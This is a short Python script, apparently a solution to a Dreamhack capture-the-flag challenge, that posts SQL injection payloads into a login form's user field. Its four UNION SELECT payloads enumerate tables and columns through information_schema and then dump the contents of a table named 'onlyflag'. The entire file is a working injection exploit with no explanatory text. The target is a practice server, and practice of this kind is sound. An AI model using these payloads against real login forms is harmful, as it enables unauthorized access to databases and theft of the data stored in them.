from bs4 import BeautifulSoup
import requests

def sendPayload(payload):
    URL = "http://host3.dreamhack.games:8358/"
    DATA = {'uid' : payload, 'upw' : '12345'}

    resp = requests.post(URL, data=DATA)

    soup = BeautifulSoup(resp.content,"html.parser")
    tr = soup.find_all('tr')
    print(tr)

PAYLOAD = "1' or 1=1 union select table_schema, 1, 1, table_name from information_schema.tables;-- -"
sendPayload(PAYLOAD)

PAYLOAD = "1' or 1=1 union select table_name, 1, 1, column_name from information_schema.columns where table_name = 'onlyflag';-- -"
sendPayload(PAYLOAD)

PAYLOAD = "1' or 1=1 union select idx, 1, 1, sname from onlyflag union select svalue, 1, 1, sflag from onlyflag union select sclose, 1, 1, 1 from onlyflag;-- -"
sendPayload(PAYLOAD)

PAYLOAD = "1' or 1=0 union select idx, 1, 1, concat(sname, svalue, sflag, sclose) from onlyflag;-- -"
sendPayload(PAYLOAD)